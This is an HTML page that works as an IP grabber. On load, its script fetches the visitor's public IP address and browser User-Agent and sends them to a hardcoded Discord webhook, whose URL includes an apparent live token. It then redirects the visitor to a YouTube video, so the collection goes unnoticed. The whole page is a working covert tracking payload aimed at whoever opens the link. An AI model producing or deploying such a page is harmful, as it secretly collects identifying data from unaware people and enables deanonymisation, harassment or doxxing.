<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Collecting IP and User-Agent</title>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: Arial, sans-serif; }
  </style>
  <script>
    (async () => {
      try {
        // Fetch IP address using ipify API
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipRes.json();
        console.log("IP:", ip);  // Log IP for debugging

        // Fetch User-Agent (browser and OS info)
        const userAgent = navigator.userAgent;
        console.log("User-Agent:", userAgent);  // Log User-Agent for debugging

        // Prepare data to send
        const data = { ip, userAgent };

        // Log the data to console before sending to webhook
        console.log("Data to send:", data);

        // Send data to your webhook URL (Replace with your actual URL)
        const response = await fetch("https://discord.com/api/webhooks/1359581999593033918/G0qtLtRlOeWNlgn1hekeqUPNVzdqd8hXTf80o8wq6YW0-yBp_Z7syBH0xNugNxmDD2j6", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        // Check if the request was successful
        if (!response.ok) {
          throw new Error(`Failed to send data to webhook. Status: ${response.status}`);
        }
        console.log("Data sent successfully!");
      } catch (error) {
        // Catch any errors and log them
        console.error("Error:", error);
      }

      // Redirect user to YouTube after collecting the information
      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    })();
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
